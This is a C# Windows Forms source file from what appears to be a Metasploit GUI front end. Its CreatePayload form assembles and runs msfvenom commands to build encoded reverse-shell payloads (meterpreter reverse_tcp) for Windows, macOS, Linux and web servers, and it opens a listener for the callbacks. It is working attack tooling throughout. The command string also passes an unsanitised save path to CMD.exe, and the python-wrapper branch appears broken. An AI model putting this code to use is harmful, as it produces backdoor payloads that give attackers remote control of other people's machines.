using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Metasploit_GUI
{
    public partial class CreatePayload : Form
    {

        public string systemroot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
        public string filetype;

        public static string Payload;

        public CreatePayload()
        {
            InitializeComponent();
        }

        private void CreatePayload_Load(object sender, EventArgs e)
        {
            UpdateHost();

            if (!Statics.pythonwrapper_installed)
            {
                groupBox5.Enabled = false;
            }

            Statics.wCreatePayload = this;
        }

        public void UpdateHost()
        {
            textBoxLhost.Text = Statics.lhost;
            textBoxLport.Text = Statics.lport;
        }

        public static void UpdateHostFromSpace()
        {
            //new CreatePayload cp; //byg vidrer
            /*CreatePayload cp = new CreatePayload();
            cp.UpdateHost();*/
            Statics.wCreatePayload.UpdateHost();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //new Options().Show();
            Profiles wProfiles = new Profiles();
            wProfiles.ShowDialog();

            UpdateHost();
        }
        
        private void comboBoxTargetType_SelectedIndexChanged(object sender, EventArgs e)
        {
            Payload = comboBoxTargetType.SelectedItem.ToString();
            Console.WriteLine(comboBoxTargetType.SelectedIndex);

            switch (comboBoxTargetType.SelectedIndex)
            {
                case 0:
                case 1:
                    labelTargetfiletype.Text = "Windows";
                    filetype = "exe";
                    break;
                case 2:
                    labelTargetfiletype.Text = "Webserver: Windows, Linux";
                    filetype = "raw";
                    break;
                case 3:
                    labelTargetfiletype.Text = "OS X";
                    filetype = "macho";
                    break;
                case 4:
                    labelTargetfiletype.Text = "OS X, Linux";
                    filetype = "elf";
                    break;
                case 5:
                    labelTargetfiletype.Text = "Windows";
                    filetype = "raw";
                    break;
            }
        }

        private void buttonBuild_Click(object sender, EventArgs e)
        {
            //msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
            string strCmdText;
            if (comboBoxEncoders.SelectedItem.ToString() == "none")
            {
                strCmdText = "/C msfvenom -p " + comboBoxTargetType.SelectedItem + " LHOST=" + Statics.lhost + " LPORT=" + Statics.lport + " -f " + filetype + " -o " + saveLocation.Text + " & pause";
            }
            else
            {
                strCmdText = "/C msfvenom -p " + comboBoxTargetType.SelectedItem + " -e " + comboBoxEncoders.SelectedItem + " LHOST=" + Statics.lhost + " LPORT=" + Statics.lport + " -f " + filetype + " -o " + saveLocation.Text + " & pause";
                //strCmdText = "/C msfvenom -p " + comboBox1.SelectedItem + " -e "+ comboBox2.SelectedItem + " && pause";
            }
            //strCmdText = "/C msfvenom -p "+comboBox1.SelectedItem;
            Console.WriteLine(strCmdText);
            //System.Diagnostics.Process.Start("CMD.exe", strCmdText);
            if (checkBoxPythonWrapper.Checked)
            {
                //strCmdText = strCmdText + " " + systemroot + @"metagui\Extensions\Python-Enwrapper\Enwrapper.exe" + '"' + saveLocation.Text + '"';
                strCmdText = $"{strCmdText} {systemroot}";
                /*
                string strCmdText1;
                strCmdText1 = '"' + saveLocation.Text + '"';
                System.Diagnostics.Process.Start(systemroot + @"metagui\Extensions\Python-Enwrapper\Enwrapper.exe", strCmdText1);
                */
            }
            System.Diagnostics.Process.Start("CMD.exe", strCmdText);
        }

        private void buttonSelectFilepath_Click(object sender, EventArgs e)
        {
            switch (comboBoxTargetType.SelectedIndex)
            {
                case 0:
                case 1:
                    saveFileDialog1.DefaultExt = "exe";
                    saveFileDialog1.Filter = "Executables (*.exe)|*.exe|All files (*.*)|*.*";
                    break;
                case 2:
                    saveFileDialog1.DefaultExt = "php";
                    saveFileDialog1.Filter = "PHP: Hypertext Preprocessor (*.php)|*.php|Text-files (*.txt)|*.txt|All files (*.*)|*.*";
                    break;
                case 3:
                    saveFileDialog1.DefaultExt = "macho";
                    saveFileDialog1.Filter = "Mach-O (*.macho)|*.macho|All files (*.*)|*.*";
                    break;
                case 4:
                    saveFileDialog1.DefaultExt = "elf";
                    saveFileDialog1.Filter = "Homebrew (*.elf)|*.elf|All files (*.*)|*.*";
                    break;
                case 5:
                    saveFileDialog1.DefaultExt = "bat";
                    saveFileDialog1.Filter = "Batch (*.bat)|*.bat|Text-files (*.txt)|*.txt|All files (*.*)|*.*";
                    break;
            }

            saveFileDialog1.ShowDialog();
            saveLocation.Text = saveFileDialog1.FileName;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            UpdateHost();
        }

        private void buttonCreateListener_Click(object sender, EventArgs e)
        {
            new ConsoleWindow(ConsoleStartOptions.handler).Show();
        }

        private void comboBoxEncoders_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
